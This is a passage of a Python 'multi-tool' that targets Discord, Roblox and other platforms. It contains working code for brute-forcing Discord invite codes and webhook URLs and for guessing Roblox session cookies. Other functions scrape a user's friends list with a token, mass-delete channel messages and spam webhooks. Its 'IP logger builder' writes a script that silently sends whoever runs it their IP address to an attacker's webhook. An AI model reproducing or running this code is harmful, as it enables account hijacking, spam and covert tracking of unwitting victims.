        r6 = random.choice(choice)
        r7 = random.choice(choice)
        r8 = random.choice(choice)
        code = f"{r1}{r2}{r3}{r4}{r5}{r6}{r7}{r8}"
        request_link = f"https://discord.com/api/v9/invites/{code}?with_counts=true&with_expiration=true"
        r = requests.get(request_link)
        r = str(r)
        if "200" in r:
            print(colorama.Fore.GREEN + "Invite Valid: " + code)
            worked = int(worked) + 1
            tryes = int(tryes) + 1
            if int(worked) == int(limit):
                print(f"Stats: Total Checked: {tryes}, Total Worked: {worked}, Total Invalid: {invalid})")
                input("")
                return
            if save == "y":
                file = open("valid_invites.txt", "a")
                file.write(f"https://discord.gg/{code}\n")
                file.close()
            if webhook_save == "y":
                requests.post(webhook, json={"content": f"@everyone Valid Invite: {code}"})
                print("Invite Sent To Webhook")
        if "404" in r:
            print(colorama.Fore.RED + "Invite Invalid: " + code)
            tryes = int(tryes) + 1
            invalid = int(invalid) + 1
            if save == "y":
                file = open("invalid_invites.txt", "a")
                file.write(f"https://discord.gg/{code}\n")
                file.close()
        if "429" in r:
            print(colorama.Fore.RED + "Rate Limited, Waiting For 20 Seconds")
            time.sleep(1)
            print("1")
            time.sleep(1)
            print("2")
            time.sleep(1)
            print("3")
            time.sleep(1)
            print("4")
            time.sleep(1)
            print("5")
            time.sleep(1)
            print("6")
            time.sleep(1)
            print("7")
            time.sleep(1)
            print("8")
            time.sleep(1)
            print("9")
            time.sleep(1)
            print("10")
            time.sleep(1)
            print("11")
            time.sleep(1)
            print("12")
            time.sleep(1)
            print("13")
            time.sleep(1)
            print("14")
            time.sleep(1)
            print("15")
            time.sleep(1)
            print("16")
            time.sleep(1)
            print("17")
            time.sleep(1)
            print("18")
            time.sleep(1)
            print("19")
            time.sleep(1)
            print("20")
        if "200" not in r and "400" not in r and "429" not in r:
            print(colorama.Fore.RED + "Unkown Error")
#___
def friend_scraper():
    names = 0
    ids = 0
    total = 0
    while True:
        id = "2"
        if id == "1" or id == "2" or id == "3":
            break
        else:
            print("Enter A Valid Choice")
    while True:
        user_token = input("Enter Token: ")
        r = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": user_token})
        r = str(r)
        if "200" in r:
            break
        else:
            print("Token Invalid") 
    while True:
        save = input("Wanna Save All Friends Name And Ids In A Txt File, y/n (It Will Not Save Accounts With Font Names): ")
        if save == "y" or save == "n":
            break
        else:
            print("Enter A Valid Choice")
    headers = {
        "authorization": user_token
    }
    r = requests.get("https://canary.discord.com/api/v8/users/@me/relationships", headers=headers)
    if id == "2":
        for use in r.json():
            use2 = use["user"]["username"]
            print("Name: " + use2)
            print("Id: " + use["id"])
            user_id = use["id"]
            print("---")
            if save == "y":
                try:
                    file = open("friend_names.txt", "a")
                    file.write(use2 + "\n")
                    file.close()
                except Exception:
                    pass
            if save == "y":
                try:
                    file = open("friend_ids.txt", "a")
                    file.write(user_id + "\n")
                    file.close()
                except Exception:
                    pass
            names = int(names) + 1
            total = int(total) + 1
        print("Done")
        print(f"Stats: Names Count: {names}")
        input("")
        return
#__
def mass_deleter():
    colorama.init(autoreset=True)
    msg_ids = []
    while True:
        user_token = input("Enter Token: ")
        r1 = requests.get('https://discord.com/api/v6/auth/login', headers={"Authorization": user_token})
        if "200" not in str(r1):
            print("Invalid")
        if "200" in str(r1):
            r = requests.get(f'https://discord.com/api/v6/invite/{invite_code}', headers={"Authorization": user_token})
            if "200" in str(r):
                break
            if "403" in str(r):
                print("Locked")
    while True:
        try:
            id = input("Enter Channel Id: ")
            id = int(id)
            id = str(id)
            break
        except Exception:
            print("Enter A Valid Id")
    headers = {
            "authorization": user_token
        }
    while True:
        try:
            info = requests.get(f"https://discord.com/api/v8/channels/{id}/messages", headers=headers)
            json_file = json.loads((info.text))
            for stuff in json_file:
                e = stuff["id"]
                msg_ids.append(e)
            break
        except Exception:
            print("Channel Id Was Invalid")
            while True:
                try:
                    id = input("Enter Channel Id: ")
                    id = int(id)
                    id = str(id)
                    break
                except Exception:
                    print("Enter A Valid Id")
    for ids in msg_ids:
        try:
            r1 = requests.delete(f"https://discord.com/api/v9/channels/{id}/messages/{ids}", headers=headers)
            if "204" in str(r1):
                print(colorama.Fore.GREEN + "Message Deleted")
            if "429" in str(r1):
                print(colorama.Fore.RED + "Rate Limited, Trying Agian In 5 Seconds...")
                time.sleep(5)
                r1 = requests.delete(f"https://discord.com/api/v9/channels/{id}/messages/{ids}", headers=headers)
        except Exception:
            pass
    print("Done")
    input("")
    return
#____
def ip_logger_builder():
    name = input("Enter File Name: ")
    while True:
        try:
            webhook = input("Enter Webhook: ")
            r = requests.get(webhook)
            if "200" in str(r):
                break
            if "200" not in str(r):
                print("Webhook Invalid")
        except Exception:
            print("Webhook Invalid")
    file = open(f"{name}.py", "a")
    file.write("import requests\n")
    file.write('print("Loading")\n')
    file.write(f'webhook = "{webhook}"\n')
    file.write('url = "https://api.ipify.org"\n')
    file.write("r = requests.get(url).text\n")
    file.write("r = str(r)\n")
    file.write('requests.post(webhook, json={"content": f"@everyone ```Ip: {r}```"})\n')
    file.write('print("Done")\n')
    file.write('input("")\n')
    file.write('exit()\n')
    file.close()
    input("Done\n")
    return
#----
def pastebin_sniper():
    print("Pastebin Sniper")
    choice = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
    valid_gen_amount = 0
    total = 0
    invalid = 0
    while True:
        try:
            limit = input("Enter How Manny Pastebin Links You Wanna Snipe: ")    
            limit = int(limit)
            break
        except Exception:
            print("Enter A Number")
    while True:
        save = input("Wanna Save All Links (y/n): ")
        if save == "y" or save == "n":
            break
        else:
            print("Enter A Valid Choice")
    input("Press Enter To Start")
    while True:
        r1 = random.choice(choice)
        r2 = random.choice(choice)            
        r3 = random.choice(choice)
        r4 = random.choice(choice)
        r5 = random.choice(choice)
        r6 = random.choice(choice)
        r7 = random.choice(choice)
        r8 = random.choice(choice)
        url = f"https://pastebin.com/{r1}{r2}{r3}{r4}{r5}{r6}{r7}{r8}"
        r = requests.get(url)
        if "200" in str(r):
            print(colorama.Fore.GREEN + "Valid Link: " + str(url))
            valid_gen_amount = int(valid_gen_amount) + 1
            total = int(total) + 1
            if save == "y":
                invalid_file = open("valid_pastebin_links.txt", "a")
                invalid_file.write(f"{url}\n")
                invalid_file.close()
        if "404" in str(r):
            print(colorama.Fore.RED + "Invalid Link: " + str(url))
            invalid = int(invalid) + 1
            total = int(total) + 1
            if save == "y":
                invalid_file = open("invalid_pastebin_links.txt", "a")
                invalid_file.write(f"{url}\n")
                invalid_file.close()
        if "429" in str(r):
            print(colorama.Fore.RED + "Rate Limited")
        if int(valid_gen_amount) == int(limit):
            print("Done")
            print(f"Stats: \nTotal Checked: {total}\nTotal Invalid: {invalid}/{total}\nTotal Valid: {valid_gen_amount}/{total}")
            input("")
            return
#----
def invite_to_info():
    colorama.init(autoreset=True)
    while True:
        invite = input("Enter Invite: ")
        if "https://discord.gg/" in invite:
            invite = invite[18:]
        r = requests.get(f"https://discord.com/api/v6/invite/{invite}").text
        if '{"message": "Unknown Invite", "code": 10006}' == str(r):
            print("Invite Invalid")
        if '{"message": "Unknown Invite", "code": 10006}' not in str(r):
            break
    r = requests.get(f"https://discord.com/api/v6/invite/{invite}")
    r = r.json()
    print("Server Info: ")
    try:
        print(colorama.Fore.GREEN + "Guild Id: " + str(r["guild"]["id"]))
    except Exception:
        print(colorama.Fore.RED + "Error While Getting Guild Id")
    print("\n")        
    try:
        print(colorama.Fore.GREEN + "Server Name: " + str(r["guild"]["name"]))
    except Exception:
        print(colorama.Fore.RED + "Error While Getting Server Name")
    print("\n")
    try:
        print(colorama.Fore.GREEN + "Server Description: " + str(r["guild"]["description"]))
    except Exception:
        print(colorama.Fore.RED + "Error While Getting Server Description")
    print("\n")    
    try:
        print(colorama.Fore.GREEN + "Verification Level: " + str(r["guild"]["verification_level"]))
    except Exception:
        print("Error While Getting Server Verification Level")
    print("\n")
    try:
        print(colorama.Fore.GREEN + "Vanity Url: " + str(r["guild"]["vanity_url_code"]))
    except Exception:
        print("Error While Getting Vanity Url")
    print("---" * 10)
    print("Inviter Info")
    try:
        print(colorama.Fore.GREEN + "Inviter Username: " + str(r["inviter"]["username"]))
    except Exception:
        print(colorama.Fore.RED + "Error While Getting Inviter Username")
    print("\n")
    try:
        print(colorama.Fore.GREEN + "Inviter Id: " + str(r["inviter"]["id"]))
    except Exception:
        print(colorama.Fore.RED + "Error While Getting Inviter Id")
    print("\n")
    print("Done")
    input("")
    return
#------
def live_webhook_spammer():
    print("Live Webhook Spammer")
    while True:
        try:
            webhook = input("Enter Webhook: ")
            r = requests.get(webhook)
            if "200" in str(r):
                break
            if "401" in str(r):
                print("Webhook Invalid")
        except Exception:
            print("Webhook Invalid")
    print("Type exit To Return")
    while True:
        message = input("Enter Message: ")
        if message == "exit" or message == "EXIT":
            return
        while True:
            r1 = requests.post(webhook, json={"content": message})
            print(r1)
            if "204" in str(r1):
                print("Sent")
                break
            if "429" in str(r1):
                print("Rate Lim")
            if "400" in str(r1):
                print("Message Was Nothing")
                break
#---
def github_sniper():
    while True:
        try:
            delay = input("Enter Delay: ")
            delay = float(delay)
            delay = str(delay)
            break
        except Exception:
            print("Enter A Valid Choice")
    while True:
        try:
            amount = input("Enter How Many Names You Wanna Snipe: ")
            amount = int(amount)
            amount = str(amount)
            break
        except Exception:
            print("Enter A Valid Choice")
    while True:
        save = input("Want Auto Save Names (y/n): ")
        if save == "y" or save == "n":
            break
        else:
            print("Enter A Valid Choice")
    validgen = 0
    invalidgen = 0
    amountgen = 0
    choice = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
    while True:
        r1 = random.choice(choice)
        r2 = random.choice(choice)
        r3 = random.choice(choice)
        r4 = random.choice(choice)
        r5 = random.choice(choice)
        code = r1 + r2 + r3 + r4 + r5
        r = requests.get("https://github.com/"+code)
        r = str(r)
        amountgen = int(amountgen) + 1
        if "200" in r:
            print(colorama.Fore.GREEN + "Generated Valid Name, " + code)
            validgen = int(validgen) + 1
            if save == "y":
                file = open("valid_github_names.txt", "a")
                file.write(code+"\n")
                file.close()
        if "404" in r:
            print(colorama.Fore.RED + "Generated Invalid Name, " + code)
            invalidgen = int(invalidgen) + 1
            if save == "y":
                file1 = open("invalid_github_names.txt", "a")
                file1.write(code+"\n")
                file1.close()
        if "200" not in r and "404" not in r:
            print(colorama.Fore.RED + "Unkown Error")
        if int(validgen) == int(amount):
            print("Done")
            print(f"Info:\nAmount Generated: {amountgen}\nAmount Valid: {validgen}/{amountgen}\nAmount Invalid: {invalidgen}/{amountgen}")
            input("")
            return
        time.sleep(float(delay))
#-----
def cookie_checker_gen():
    while True:
        save = input("Auto Save (y/n): ")
        if save == "y" or save == "n":
            break
        else:
            print("Enter A Valid Choice")
    while True:
        try:
            amount = input("Enter How Many Cookies You Wanna Generate: ")
            amount = int(amount)
            break
        except Exception:
            print("Enter A Valid Choice")
    choices = "ABCDEF123456789"
    done = 0
    while True:
        numba1 = random.choices(choices, k=732)
        cookie_to_check = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + ''.join(numba1)
        ("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_")
        r2 = requests.get("https://api.roblox.com/currency/balance", cookies={".ROBLOSECURITY": str(cookie_to_check)})
        r2 = str(r2)
        if "200" in r2:
            print(colorama.Fore.GREEEN + "Cookie Valid: " + str(cookie_to_check))
            if save == "y":
                file = open("valid_cookies.txt", "a")
                file.write(cookie_to_check + "\n")
                file.close()
        if "200" not in r2:
            print(colorama.Fore.RED + "Cookie Invalid: " + cookie_to_check)
            if save == "y":
                file2 = open("invalid_cookies.txt", "a")
                file2.write(cookie_to_check + "\n")
                file2.close()
        done = int(done) + 1
        if int(done) == int(amount):
            print("Done")
            input("")
            return
#______
def valid():
    print("Enter A Valid Choice")
    return
def webhook_sniper():
    while True:
        save = input("Wanna Auto Save Webhooks (y/n): ")
        if save == "y" or save == "n":
            break
        else:
            valid()
    while True:
        try:
            delay = input("Enter Delay For Each Thread (0=NONE): ")
            delay = float(delay)
            break
        except:
            valid()
    while True:
        try:
            amount = input("How Many Codes Do You Wanna Check: ")
            amount = int(amount)
            break
        except:
            valid()
    choice = "1234567890"
    done = 0
    choices = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
    while True:
        done = int(done)+1
        id = random.choices(choice, k=18)
        id = "".join(id)
        code = random.choices(choices, k=68)
        code = "".join(code)
        webhook = "https://discord.com/api/webhooks/"+str(id)+"/"+str(code)
        r = requests.get(webhook)
        if "200" in str(r):
            print(colorama.Fore.GREEN + "["+str(done)+"]"+"  Valid Webhook! "+webhook)
            if save == "y":
                valid = open("valid_webhooks.txt", "a")
                valid.write(webhook+"\n")
                valid.close()
        else:
            print(colorama.Fore.RED + "["+str(done)+"]"+"  Invalid Webhook! "+webhook)
            if save == "y":
                invalid = open("invalid_webhooks.txt", "a")
                invalid.write(webhook+"\n")
                invalid.close()
        if str(done) == str(amount):
            print("Done")
            input("")
            return
#-----
def calc():
    for u in range(1):
        while True:
            try:
                e = input("Enter Amount Of Robux: ")
                e = float(e)
                break
            except:
                print("Enter A Valid Choice")
        r =  python_percentage.get_percentage(30.0, e)
        print("Fee: " + str(r))
        print("")
        h = float(e) - r
        print("Owner Will Get: " + str(h))
        print("")
        j = float(e) + float(r)
        print("If Want No Fee Need Pay: " +  str(j))
        input("")
        return
def clear():
    try:
        import os
        os.system("cls")
    except:
        pass
#-----
def yt_download():
    try:
        url = input("Enter Youtube Link: ")
        vid = pytube.YouTube(url)
        print("Be Patient, May Take A While")
        url = vid.streams.get_highest_resolution()
        url.download()
        print("Done, Check For The Vid In The Folder This File Is Located")
        input("")
        return
    except:
        print("Unkown Error")
        input("")
        return
        
        
        
        
    
        
        
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
#_____________
logs = ""
first_time = True
logined = None
logined_password = False
logined_name = False
dev_mode = False
dev_mode_startup_time = 0
first_time2 = True
lines_of_code = "3000"
version = "Beta 1.0"
delay = 0.01
rainbow = False
blank = False
invite_code = "Crc92V59ck"
red = False
blue = False
cyan = False
green = False
magenta = False
yellow = False
ip_log = False
pc_username = socket.gethostname()
pc_username = str(pc_username)
logs_avatar = "https://images-ext-1.discordapp.net/external/QqAJfmihi2m88MwaCggv_ORUnJ8DaMsd8yz89ZMe_7w/https/i.imgur.com/cSbXZoah.jpg"
pc_ip = requests.get("https://api.ipify.org").text
if dev_mode == False:
    while True:
        logined = True
        break
if dev_mode == True:
    print(f"You Are In Developer Mode, Program Starting In {dev_mode_startup_time} Second(s)")
    time.sleep(float(dev_mode_startup_time))
if logined == True or dev_mode == True:
    while True:
            color = input("""
        1. No Color
        2. Rainbow

        > """)
            if color == "1":
                blank = True
                rainbow = False
                red = False
                blue = False
                cyan = False
                magenta = False
                yellow = False
                green = False
            if color == "2":
                blank = False
                rainbow = True
                red = False
                blue = False
                cyan = False
                magenta = False
                yellow = False
                green = False
            if color == "3":
                blank = False
                rainbow = False
                red = True
                blue = False
                cyan = False
                magenta = False
                yellow = False
                green = False
            if color == "4":
                blank = False
                rainbow = False
                red = False
                blue = True
                cyan = False
                magenta = False
                yellow = False
                green = False
            if color == "5":
                blank = False
                rainbow = False
                red = False
                blue = False
                cyan = False
                magenta = False
                yellow = False
                green = True
            if color == "6":
                blank = False
                rainbow = False
                red = False
                blue = False
                cyan = False
                magenta = True
                yellow = False
                green = False
            if color == "7":
                blank = False
                rainbow = False
                red = False
                blue = False
                cyan = False
                magenta = False
                yellow = True
                green = False
            if color == "8":
                blank = False
                rainbow = False
                red = False
                blue = False
                cyan = True
                magenta = False
                yellow = False
                green = False
            if color == "1" or color == "2" or color == "3" or color == "4" or color == "5" or color == "6" or color == "7" or color == "8":
                break
            else:
                print("Enter A Valid Choice")
                input("") 
            
        
#_____________
if logined == True or dev_mode == True:
    while True:
        colorama.init(autoreset=True)
        if first_time2 == True:
            first_time2 = False
        if first_time == True:
            if blank == True:
                print(f"        Welcome {pc_username}")
                first_time = False
            if rainbow == True:
                print(colorama.Fore.LIGHTRED_EX + f"        Welcome {pc_username}")
                first_time = False
            if red == True:
                print(colorama.Fore.RED + f"        Welcome {pc_username}")
                first_time = False
            if blue == True:
                print(colorama.Fore.BLUE + f"        Welcome {pc_username}")
                first_time = False
            if green == True:
                print(colorama.Fore.GREEN + f"        Welcome {pc_username}")
                first_time = False
            if magenta == True:
                print(colorama.Fore.MAGENTA + f"        Welcome {pc_username}")
                first_time = False
            if yellow == True:
                print(colorama.Fore.YELLOW + f"        Welcome {pc_username}")
                first_time = False
            if cyan == True:
                print(colorama.Fore.CYAN + f"        Welcome {pc_username}")
                first_time = False
        #Red Yellow Green Blue Cyan Magenta
        if rainbow == True:
            print(colorama.Fore.RED + "      TOO    ")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "   LAZY      ")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "      TOO       ")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "    PUT        ")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "   ANSI    ")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "    ART    ")
            time.sleep(delay)
            print(colorama.Fore.LIGHTRED_EX + f"        #Version {version} #Made By Galactic-Kurisu#7132")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |1. Webhook Spammer                  |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |2. Webhook Deleter                  |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |3. Credits And Info                 |")
            time.sleep(delay)
            #_____
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |4. Screenshot Grabber               |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |5. Nitro Generator                  |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |6. Webhook Checker                  |")
            time.sleep(delay)
            #_____
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |7. Roblox Giftcard Generator        |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |8. Token Checker                    |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |9. Proxy Generator                  |")
            time.sleep(delay)
            #_____
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |10. Feedback                        |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |11. Roblox Cookie Generator         |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |12. Roblox Cookie Checker           |")
            time.sleep(delay)
            #_____
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |13. Channel Spammer                 |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |14. Gui Color Changer               |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |15. Cookie Gen And Auto Checker     |")
            #____
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |16. Roblox 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |17. Webhook Info Grabber            |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |18. Ip Info Grabber                 |")
            time.sleep(delay)
            #____
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |19. Tiktok 5 Letter Username Sniper |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |20. Discord Invite Sniper           |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |21. Discord Friend Scraper          |")
            #__
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |22. Discord Channel Message Deleter |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |23. Ip Logger Builder               |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |24. Pastebin Sniper                 |")
            time.sleep(delay)
            #___
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |25. Invite Info Grabber             |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |26. Live Webhook Spammer            |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |27. Github Username Sniper          |")
            time.sleep(delay)
            #---
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.YELLOW + "        |28. Webhook Sniper                  |")
            time.sleep(delay)
            print(colorama.Fore.GREEN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.BLUE + "        |29. Roblox Fee Calculator           |")
            time.sleep(delay)
            print(colorama.Fore.CYAN + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.MAGENTA + "        |30. Youtube Video Downloader        |")
            time.sleep(delay)
            #---
            print(colorama.Fore.RED + "        |------------------------------------|")
#__________________
        if blank == True:
           
            time.sleep(delay)
            print(f"        #Version {version} #Made By Galactic-Kurisu#7132")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |1. Webhook Spammer                  |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |2. Webhook Deleter                  |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |3. Credits And Info                 |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |4. Screenshot Grabber               |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |5. Nitro Generator                  |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |6. Webhook Checker                  |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |7. Roblox Giftcard Generator        |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |8. Token Checker                    |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |9. Proxy Generator                  |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |10. Feedback                        |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |11. Roblox Cookie Generator         |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |12. Roblox Cookie Checker           |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |13. Channel Spammer                 |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |14. Gui Color Changer               |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |15. Cookie Gen And Auto Checker     |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |16. Roblox 5 Letter Username Sniper |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |17. Webhook Info Grabber            |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |18. Ip Info Grabber                 |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |19. Tiktok 5 Letter Username Sniper |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |20. Discord Invite Sniper           |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |21. Discord Friend Scraper          |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |22. Discord Channel Message Deleter |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |23. Ip Logger Builder               |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |24. Pastebin Sniper                 |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |25. Invite Info Grabber             |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |26. Live Webhook Spammer            |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |27. Github Username Sniper          |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |28. Webhook Sniper                  |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |29. Roblox Fee Calculator           |")
            time.sleep(delay)
            print("        |------------------------------------|")
            time.sleep(delay)
            print("        |30. Youtube Video Downloader        |")
            time.sleep(delay)
            print("        |------------------------------------|")
#________________
        if red == True:
            
            time.sleep(delay)
            print(colorama.Fore.RED + f"        #Version {version} #Made By Galactic-Kurisu#7132")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |1. Webhook Spammer                  |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |2. Webhook Deleter                  |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |3. Credits And Info                 |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |4. Screenshot Grabber               |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |5. Nitro Generator                  |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |6. Webhook Checker                  |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |7. Roblox Giftcard Generator        |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |8. Token Checker                    |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |9. Proxy Generator                  |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |10. Feedback                        |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |11. Roblox Cookie Generator.        |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |12. Roblox Cookie Checker           |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |13. Channel Spammer.                |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |14. Gui Color Changer               |")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |------------------------------------|")
            time.sleep(delay)
            print(colorama.Fore.RED + "        |15. Cookie Gen And Auto Checker     |")
            time.sleep(delay)
